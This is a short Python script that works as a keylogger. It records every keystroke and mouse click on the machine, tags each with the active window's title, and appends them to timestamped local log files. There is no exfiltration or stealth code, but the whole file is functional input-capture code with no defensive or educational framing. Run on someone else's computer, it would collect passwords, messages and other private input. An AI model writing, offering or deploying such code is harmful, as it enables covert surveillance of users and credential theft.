import os
from datetime import datetime
from pynput import keyboard, mouse
import psutil
import platform

# Create log directory
log_dir = "logs"
os.makedirs(log_dir, exist_ok=True)

# Define log file with session-specific naming
log_file = os.path.join(log_dir, f"log_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt")

# Utility function: Write logs
def write_log(data):
    try:
        with open(log_file, "a", encoding="utf-8") as file:
            file.write(f"{datetime.now().strftime('%Y-%m-%d %H:%M:%S')} - {data}\n")
    except Exception as e:
        print(f"Error writing log: {e}")

# Utility function: Get active application
def get_active_window():
    try:
        if platform.system() == "Windows":
            import win32gui
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        elif platform.system() == "Darwin":  # macOS
            from AppKit import NSWorkspace
            return NSWorkspace.sharedWorkspace().activeApplication()['NSApplicationName']
        elif platform.system() == "Linux":
            # This may require additional dependencies like `wmctrl`
            return os.popen("xdotool getwindowfocus getwindowname").read().strip()
    except Exception:
        return "Unknown Application"
    return "No Active Window"

# Keyboard Listener: Log keystrokes
def on_key_press(key):
    try:
        app = get_active_window()
        if hasattr(key, 'char') and key.char is not None:
            write_log(f"Key Pressed: '{key.char}' in {app}")
        else:
            write_log(f"Special Key Pressed: {key} in {app}")
    except Exception as e:
        write_log(f"Error capturing key: {e}")

# Mouse Listener: Log mouse clicks
def on_click(x, y, button, pressed):
    try:
        app = get_active_window()
        action = "Pressed" if pressed else "Released"
        write_log(f"Mouse {action}: {button} at ({x}, {y}) in {app}")
    except Exception as e:
        write_log(f"Error capturing mouse event: {e}")

# Start listeners for both keyboard and mouse
keyboard_listener = keyboard.Listener(on_press=on_key_press)
mouse_listener = mouse.Listener(on_click=on_click)

keyboard_listener.start()
mouse_listener.start()

# Wait for both listeners to complete (end with CTRL+C or ESC key manually)
keyboard_listener.join()
mouse_listener.join()
